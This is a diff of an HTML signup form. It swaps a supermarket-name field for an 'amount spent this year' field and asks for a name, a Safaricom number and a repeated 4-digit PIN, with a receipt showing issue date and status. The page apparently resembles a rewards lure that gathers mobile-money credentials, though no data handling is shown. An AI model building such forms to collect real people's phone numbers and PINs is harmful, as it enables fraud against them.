@@ -62,9 +62,17 @@
         <form id="signupForm" novalidate>
           <label>Your name<input name="username" autocomplete="name" placeholder="e.g. Wanjiru Kamau" maxlength="30" required /></label>
           <label>Safaricom number<input name="phone" type="tel" inputmode="numeric" autocomplete="tel" placeholder="0712 345 678" maxlength="13" required /></label>
-          <label>Supermarket you shopped at this year
-            <input name="branch" autocomplete="off" placeholder="Type the supermarket or branch name" maxlength="60" required />
-          </label>
+          <label>Amount spent this year in your shopping(KSh)
+  <input
+    name="amountSpent"
+    type="text"
+    inputmode="numeric"
+    autocomplete="off"
+    placeholder="e.g. 25 000"
+    maxlength="12"
+    required
+  />
+</label>
           <div class="two">
             <label>4-digit PIN<input name="pin" type="password" inputmode="numeric" maxlength="4" autocomplete="new-password" placeholder="••••" required /></label>
             <label>Repeat PIN<input name="confirmPin" type="password" inputmode="numeric" maxlength="4" autocomplete="new-password" placeholder="••••" required /></label>
@@ -121,7 +129,7 @@
             <dl>
               <div><dt>Name</dt><dd id="rName"></dd></div>
               <div><dt>Phone</dt><dd id="rPhone"></dd></div>
-              <div><dt>Supermarket</dt><dd id="rBranch"></dd></div>
+              <div><dt>Amount spent (year)</dt><dd id="rSpent"></dd></div>
               <div><dt>Issued</dt><dd id="rDate"></dd></div>
               <div><dt>Status</dt><dd id="rStatus"></dd></div>
             </dl>
